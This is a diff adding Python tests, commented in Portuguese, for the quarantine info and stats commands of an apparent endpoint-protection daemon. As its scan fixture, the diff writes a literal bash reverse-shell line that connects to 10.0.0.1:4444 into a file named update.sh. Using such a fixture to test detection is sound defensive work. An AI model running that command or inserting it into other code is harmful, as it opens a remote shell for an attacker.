@@ -262,3 +262,100 @@ class TestScanStreamingViaIPC:
         data_direct = json.loads(result_direct.stdout)
         assert data_direct["scanned_files"] == 1
         assert data_direct["threats_found"] == 0
+
+
+# ---------------------------------------------------------------------------
+# ekp quarantine info / stats — via daemon (IPC), fecha o último gap real
+# de sudo do Patch 11 (cmd_list já tinha sido migrado em 2026-08-22, info/
+# stats continuavam abrindo o SQLite root-owned direto)
+# ---------------------------------------------------------------------------
+
+# Reverse shell literal inofensivo (nunca executado, só o padrão de texto
+# que um invasor real usaria) — mesmo conteúdo do teste intenso de invasão
+# simulada de 2026-08-29 (tests/test_engine.py), reaproveitado aqui só pra
+# gerar um item real em quarentena via `ekp scan file` (que também dispara
+# auto-quarentena, igual ao caminho do monitor).
+_REVERSE_SHELL_CONTENT = b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
+
+
+class TestQuarantineInfoStatsViaIPC:
+    def _quarantine_one_item(
+        self, running_daemon: dict, tmp_path: Path
+    ) -> dict:
+        """Escaneia um reverse shell simulado via `ekp scan file` (daemon
+        real) pra gerar um item de quarentena de verdade, e retorna o
+        dict da entrada via `ekp quarantine list --json`."""
+        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
+        evil_path = tmp_path / "update.sh"
+        evil_path.write_bytes(_REVERSE_SHELL_CONTENT)
+
+        scan = _run_cli(
+            "scan", "file", str(evil_path), "--json", "--config", config_path,
+            env=running_daemon,
+        )
+        assert scan.returncode == 1, scan.stdout + scan.stderr  # ameaça detectada
+
+        listing = _run_cli(
+            "quarantine", "list", "--json", "--config", config_path,
+            env=running_daemon,
+        )
+        assert listing.returncode == 0, listing.stdout + listing.stderr
+
+        import json
+        entries = json.loads(listing.stdout)
+        assert len(entries) == 1, "esperava exatamente 1 item auto-quarentenado"
+        return entries[0]
+
+    def test_info_via_daemon_ipc(self, running_daemon: dict, tmp_path: Path) -> None:
+        entry = self._quarantine_one_item(running_daemon, tmp_path)
+        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
+
+        result = _run_cli(
+            "quarantine", "info", str(entry["id"]), "--json", "--config", config_path,
+            env=running_daemon,
+        )
+        assert result.returncode == 0, result.stdout + result.stderr
+
+        import json
+        data = json.loads(result.stdout)
+        assert data["quarantine_id"] == entry["quarantine_id"]
+        assert data["sha256"] == entry["sha256"]
+
+    def test_stats_via_daemon_ipc(self, running_daemon: dict, tmp_path: Path) -> None:
+        self._quarantine_one_item(running_daemon, tmp_path)
+        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
+
+        result = _run_cli(
+            "quarantine", "stats", "--json", "--config", config_path, env=running_daemon,
+        )
+        assert result.returncode == 0, result.stdout + result.stderr
+
+        import json
+        data = json.loads(result.stdout)
+        assert data["active"] == 1
+        assert data["total"] == 1
+
+    def test_info_and_stats_fallback_direct_sqlite_after_daemon_stopped(
+        self, running_daemon: dict, tmp_path: Path
+    ) -> None:
+        entry = self._quarantine_one_item(running_daemon, tmp_path)
+        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
+
+        stop = _run_cli("stop", "--config", config_path, env=running_daemon)
+        assert stop.returncode == 0, stop.stdout + stop.stderr
+        time.sleep(0.5)
+
+        import json
+
+        info = _run_cli(
+            "quarantine", "info", str(entry["id"]), "--json", "--config", config_path,
+            env=running_daemon,
+        )
+        assert info.returncode == 0, info.stdout + info.stderr
+        assert json.loads(info.stdout)["quarantine_id"] == entry["quarantine_id"]
+
+        stats = _run_cli(
+            "quarantine", "stats", "--json", "--config", config_path, env=running_daemon,
+        )
+        assert stats.returncode == 0, stats.stdout + stats.stderr
+        assert json.loads(stats.stdout)["active"] == 1
